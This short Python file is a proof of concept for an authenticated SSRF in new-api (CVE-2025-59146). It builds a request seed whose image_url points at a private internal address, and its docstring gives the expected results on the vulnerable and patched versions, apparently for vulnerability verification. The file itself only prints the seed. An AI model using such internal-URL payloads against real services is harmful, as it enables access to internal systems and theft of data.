#!/usr/bin/env python3
"""
Original PoC for CVE-2025-59146 (authenticated SSRF via image_url).

A regular authenticated user submits POST /v1/chat/completions whose image_url
is a DIRECT internal URL. Official new-api fetches it server-side during
prompt-token counting (GET_MEDIA_TOKEN).

  http://172.31.9.9:80/internal-secret.png   (direct private-IP URL)

Expected:
  v0 (calciumion/new-api:v0.9.0.4) -> canary records the hit
  v1 (calciumion/new-api:v0.9.0.5) -> blocked: private IP address not allowed
"""
import json

SEED_URL = "http://172.31.9.9:80/internal-secret.png"

if __name__ == "__main__":
    print(json.dumps({"image_url": SEED_URL, "path": "/v1/chat/completions"}))
